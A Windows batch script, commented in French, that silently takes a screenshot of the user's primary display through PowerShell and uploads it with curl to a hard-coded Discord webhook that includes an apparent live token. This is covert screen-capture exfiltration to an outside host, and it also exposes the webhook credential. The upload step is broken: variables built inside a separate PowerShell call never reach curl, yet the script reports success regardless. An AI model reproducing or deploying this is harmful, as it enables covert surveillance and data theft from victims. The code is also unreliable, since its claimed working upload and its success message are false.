@echo off
setlocal enabledelayedexpansion

rem Définir l'URL du webhook Discord
set "webhookUrl=https://discord.com/api/webhooks/1151525024088477868/uRlaL-EA8gyLBxmjfzoZg5aAB1QT24phwo9XA13_rA2tai3rMHp2E7KqZEKN9sMS54kF"

rem Définir le chemin d'accès complet pour enregistrer la capture d'écran dans le répertoire temporaire de l'utilisateur
set "fileName=%TEMP%\screenshot.png"

rem Prendre une capture d'écran avec PowerShell
powershell.exe -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screenshot = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screenshot.Width, $screenshot.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screenshot.Location, [System.Drawing.Point]::Empty, $screenshot.Size); $bitmap.Save('%fileName%', [System.Drawing.Imaging.ImageFormat]::Png);"

rem Construire la requête multipart/form-data avec PowerShell
powershell.exe -Command "$boundary = [System.Guid]::NewGuid().ToString(); $LF = \"`r`n\"; $bodyLines = @( \"--$boundary\", \"Content-Disposition: form-data; name='file'; filename='screenshot.png'\" , \"Content-Type: image/png\", \"\", \"@%fileName%\", \"--$boundary--\", \"\" ); $body = $bodyLines -join $LF; $contentType = 'multipart/form-data; boundary=$boundary';"

rem Envoyer la requête à l'URL du webhook Discord avec curl
curl -X POST -H "Content-Type: $contentType" -d "%body%" %webhookUrl%

echo Capture d'écran envoyée avec succès au webhook Discord.
